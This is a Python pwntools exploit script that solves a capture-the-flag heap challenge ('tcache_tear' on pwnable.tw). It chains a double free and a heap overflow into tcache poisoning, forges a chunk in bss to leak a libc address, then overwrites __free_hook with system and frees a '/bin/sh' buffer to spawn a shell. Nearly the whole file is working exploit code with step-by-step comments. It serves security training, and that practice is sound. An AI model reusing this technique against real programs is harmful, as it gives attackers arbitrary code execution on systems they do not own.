#!/usr/bin/env python3

# Challenge labels: tcache poisoning using Double Free and Heap Overflow, free_hook Overwrite

from pwn import *

import os
os.chdir("./patched")

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

exe = ELF("./tcache_tear_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

serv = "chall.pwnable.tw"
port = 10207

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        cmd = [exe.path]
        r = process(cmd)
        if args.GDB:
            gdb.attach(r, gdbscript="""
            b *0x400b14
            b *0x00400c54
            """)
    return r

r = conn()


def alloc(size: int, data: bytes):
    # assert size <= 0xff and size >= 0
    sla(b'choice :', b'1')
    sla(b'Size:', sen(size))
    if size > 0:
        sna(b'Data:', enc(data))

def free():
    sla(b'choice :', b'2')

def read_from_bss():
    sla(b'choice :', b'3')
    r.recvuntil(b':') # Get rid of b'Name :'
    return r.recv(numb=0x20)

def main():

    ''' This solve implements concept.py with fewer free()'s by leveraging the heap overflow '''

    # Put data into bss - this is not only required by the binary, but also is so that we chunk-forge to a size of 0x40
    sna(b'Name:', b'\x00'*0x8 + p64(0x41) + b'A'*0x10)

    '''
    Leaking libc through a combination of double-freeing and heap overflowing into tcache poisoning and forging the chunk in bss
    '''
    # Chunk that we will perform the overflow from
    alloc(0x8, b'A'*0x8)
    free()

    # Setup the freed chunks whose next ptrs we shall overwrite using the heap overflow
    alloc(0x20, b'B'*0x10)
    free()
    alloc(0x30, b'C'*0x20)
    free()
    free() # Extra free so that the count[idx] for the tcache bin does eventually become 0xff and be more than 7 thus avoiding the eventual freeing into the tcache

    # Use the heap overflow to overwrite next ptrs of the chunks in tcache bin of sizes 0x30 and 0x40
    alloc(0x8, b''.join([
        b'D'*0x10, 
        b'\x00'*0x8, p64(0x31), # alloc-ing so prev_size doesn't matter, size
        p64(0x602070), b'E'*0x18, # next ptr, points to name+0x10
        p64(30), p64(0x41), # prev_size, size
        p64(0x602040), b'F'*0x28 # next ptr, points to 0x602040 which we want to deref and leak
        ]))

    # Perform allocations such that
    # 1. name+0x10 is the next allocated for the tcache bin for size 0x30
    # 2. libc.stderr is the next allocated for the tcache bin for size 0x40
    alloc(0x20, b'G')
    alloc(0x30, b'H') # We have no choice but to corrupt the LSB of bss.stderr as a side effect, but our leak remains unchanged
    alloc(0x30, b'I')

    # What we do now is to alloc a size of 0x30 so that 0x602070 goes into the bss ptr which we're using to keep track of chunks,
    # before freeing it (remember, its size got forced to 0x40!) so that its next ptr contains our leak
    alloc(0x20, b'J'*0x8)
    free()

    # Using option 3 of the binary, we read 0x20 bytes from 0x602060 and get our libc leak
    libc.address = u64(read_from_bss()[16:24]) - 0x3ec680
    log.info(f"{hex(libc.address)=}")

    # Overwrite free_hook within the libc with libc system and run free to spawn a shell
    alloc(0x8, b'G'*0x8)
    free()
    free()
    alloc(0x8, p64(libc.sym.__free_hook))
    alloc(0x8, b'H'*0x8)
    alloc(0x8, p64(libc.sym.system))
    alloc(0x40, b'/bin/sh\x00')

    # Actuate the free_hook by freeing
    free()

    r.interactive()


if __name__ == "__main__":
    main()
